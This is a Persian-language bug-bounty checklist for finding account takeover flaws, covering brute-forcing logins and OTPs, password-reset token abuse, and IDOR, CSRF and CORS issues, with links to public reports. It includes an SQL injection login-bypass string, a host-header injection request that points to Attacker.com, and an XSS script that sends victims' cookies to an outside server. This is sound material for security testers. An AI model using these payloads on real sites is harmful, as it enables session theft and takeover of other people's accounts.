# 12.Acount takeover checklist

خیلی از ایده های این بخش از  `[https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5](https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5)` گرفته شده

OAuth to Account takeover

```
https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
```

Pre-Account Takeover

یک pre-account takeover زمانی رخ میده که یک مهاجم با استفاده از یک روش ثبت نام یک حساب کاربری ایجاد میکنه و قربانی با استفاده از یک روش ثبت نام متفاوت با استفاده از همون ایمیل یک حساب کاربری دیگه ایجاد میکنه. از اونجایی که ایمیل ها یکسان هست, اپلیکیشن این دو حساب رو به هم متصل میکنه. زمانی که اپلیکیشن قادر به سنجیدن ایمیل نیست

نجوه هانت:

سعی کنید هر ایمیلی رو بدون تاییدش ثبت کنید

دوباره سعی کنید یک حساب بسازید, اما این بار با روشی متفاوت, مثل «ثبت نام با Google» با همون ایمیل

با توجه به اینکه هر دو ایمیل یکسان هستند, وب اپلیکیشن این دو حساب رو به هم متصل میکنه

حالا سعی کنید با استفاده از پسورد و یوزرنیم مشخص شده لاگین کنید. بررسی کنید که میتونید اطلاعات مربوط به اون حساب رو که از طریق Google بازیابی شده ببینید یا نه

Account takeover due to Improper Rate limit

نحوه هانت:

ریکوئست صفحه لاگین رو capture کنید, در حالی که یوزرنیم و پسورد رو وارد میکنید

به intruder بفرستیدش و بروت فورسش کنید

ریسپانس و length رو انالیز کنید

Account takeover by utilizing sensitive data exposure

زمانی Sensitive data exposure اتفاق میفته که یک وب اپلیکیشن به درستی از اطلاعات محرمانه محافظت نکنه و در نتیجه اطلاعات حساس یا داده‌های مربوط به کاربران یا هر چیز مرتبط باهاشون در اختیار شخص ثالث قرار بگیره

گهگاهی, اپلیکیشن داده های غیر ضروری مثل OTP های معتبر, هش ها یا پسورد رو روی قسمت هایی از ریکوئست و ریسپانس نمایش میده. بنابراین ایده خوبیه که به قسمت هایی ریسپانس و ریکوئست توجه کنید.

login

بررسی کنید که ایا میتونید پسورد رو بروت فورس کنید

سعی کنید OAuth misconfigurations تست کنید

بررسی کنید که ایا میتونید OTP لاگین رو بروت فورس کنید

سعی کنید JWT misconfigurations تست کنید

سعی کیند SQLI برای بایپس احراز هویت `--;admin" or 1=1`

بررسی کنید که ایا اپلیکیشن OTP یا token رو میسنجه

password reset

بررسی کنید ببینید میتونید OTP پسورد ریست رو بروت فورس کنید

تست کنید ببینید توکن رو میتونید پیش بینی کنید

سعی کنید JWT misconfigurations تست کنید

بررسی کنید که ایا endpoint ریست پسورد نسبت به IDOR اسیب پذیر هست

بررسی کنید که ایا endpoint ریست پسورد نسبت به Host Header injection اسیب پذیر هست

بررسی کنید که ایا endpoint ریست پسورد token یا OTP رو در ریسپانس HTTP فاش میکنه

بررسی کنید که ایا اپلیکیشن OTP یا token رو میسنجه

سعی کنید HTTP parameter Pollution (HPP) رو تست کنید

XSS to Account Takeover

اگر اپلیکیشن از auth token استفاده نمیکنه یا به دلیل فلگ **HttpOnly** نمیتونید به کوکی ها دسترسی پیدا کنید, میتونید CSRF token رو بگیرید و ریکوئست برای تغییر ایمیل یا پسورد کاربرها ایجاد کنید.

سعی کنید کوکی ها رو استخراج کنید

سعی کنید Auth Token رو استخراج کنید

اگر ویژگی "دامنه" کوکی تنظیم شده, xss رو در ساب دامنه ها جستجو کنید و ازش برای استخراج کوکی ها استفاده کنید.

مثال PoC:

این اسکریپت یک element پنهان <img> ایجاد میکنه
زمانی که مرورگر سعی می کنه تصویرو لود کنه
کوکی های قربانی به سرور شما ارسال میشه

```jsx
<script>
   var new_img = document.createElement('img');
   new_img.src = "http://yourserver/" + document.cookie;
   new_img.style = 'display: none;'
   document.body.appendChild(new_img);
</script>
```

CSRF to Account Takeover

بررسی کنید که endpoint اپدیت ایمیل در برابر CSRF اسیب پذیر هست

بررسی کنید که endpoint تغییر پسورد در برابر CSRF اسیب پذیر هست

IDOR to Account Takerover

بررسی کنید که endpoint اپدیت ایمیل در برابر IDOR اسیب پذیر هست

بررسی کنید که endpoint تغییر پسورد در برابر IDOR اسیب پذیر هست

بررسی کنید که endpoint ریست پسورد در برابر IDOR اسیب پذیر هست

اسیب پذیری Account Takeover توسط دستکاری استاتوس کد ریسپانس

Account takeover by exploiting Weak cryptography

```
بررسیش کنید
https://infosecwriteups.com/weak-cryptography-in-password-reset-to-full-account-takeover-fc61c75b36b9
```

Password or email change function

اگر میخواید پسورد رو تغییر بدید و پارامتر ایمیل رو در ریکوئست تغییر پسورد میبینید, ایمیل خودتونو به ایمیل قربانی تغییر بدید

Sing-Up Function

اگر میخواید حساب جدیدی رو در سایت تارگت ایجاد کنید, در فیلد ایمیل, ایمیل تارگت رو بزارید

اگر سعی می‌کنید با استفاده از شخص ثالث حساب جدیدی رو در سایت تارگت ایجاد کنید, در شخص ثالث به جای ایمیل از شماره تلفن استفاده کنید سپس حساب شخص ثالث رو به سایت تارگت لینک کنید. سپس به تنظیمات برید و سعی کنید ایمیل قربانی رو به حسابتون لینک کنید

Rest Token

سعی کنید از REST token خودتون در حساب تارگت استفاده کنید.

راهنمایی: `$email=Target@email.com&code=$Attacker_TOKEN`

اگر REST token عددی هست بروت فورسش کنید

راهنمایی: `$email=Target@email.com&code=$TOKEN`

سعی کنید بفهمید که توکن چظوری تولید میشه: بر اساس Time Stamp یا ID کاربر یا ایمیل کاربر ایجاد شده

Host Header Injection

موثع ارسال ریکوئست به حساب, POST ریکوئست رو intercept کنید و مقدار هدر Host رو از target.site به Attacker.com تغییر بدید

راهنمایی: 

```
POST /PassRest HTTP/1.1
Host: Attacker.com
```

CORS Misconfiguration to Account Takeover

اگر صفحه دارای CORS misconfigurations باشه, ممکنه بتونید اطلاعات حساس کاربر رو به سرقت ببرید تا حسابشو تصاحب کنید یا مجبورش کنید اطلاعات احراز هویتشو برای همین منظور تغییر بده:

```
https://book.hacktricks.xyz/pentesting-web/cors-bypass
```

Account takeover via leaked session cookie

```
https://hackerone.com/reports/745324
```

HTTP Request Smuggling to ATO

```
https://hackerone.com/reports/737140
https://hackerone.com/reports/740037
```

Bypassing Digits origin validation which leads to account takeover

```
https://hackerone.com/reports/129873
```

گزارش برتر ATO در هکرون

```
https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md
```